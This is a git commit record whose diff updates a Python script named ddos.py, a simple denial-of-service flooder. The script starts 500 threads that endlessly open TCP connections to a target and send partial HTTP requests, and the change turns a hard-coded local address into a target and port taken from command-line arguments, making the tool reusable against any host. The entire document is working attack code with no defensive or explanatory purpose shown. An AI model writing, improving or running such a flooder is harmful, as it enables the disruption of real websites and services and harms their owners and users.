f2837c23041a308e8bec036ab7aed7bb6ffda676
Mustafe <mustafeyare041@gmail.com>
2024-12-03 20:42:41 +0300

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,16 +1,25 @@
 import socket
 import threading
+import sys
 
-target_ip = "192.168.1.1"
-target_port = 80
-
-def attack():
+def attack(target_ip, target_port):
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target_ip, target_port))
         s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
         s.close()
 
-for i in range(500):
-    thread = threading.Thread(target=attack)
-    thread.start()
+def main():
+    if len(sys.argv) != 3:
+        print("Usage: python script.py <target_ip> <target_port>")
+        sys.exit(1)
+
+    target_ip = sys.argv[1]
+    target_port = int(sys.argv[2])
+
+    for i in range(500):
+        thread = threading.Thread(target=attack, args=(target_ip, target_port))
+        thread.start()
+
+if __name__ == "__main__":
+    main()
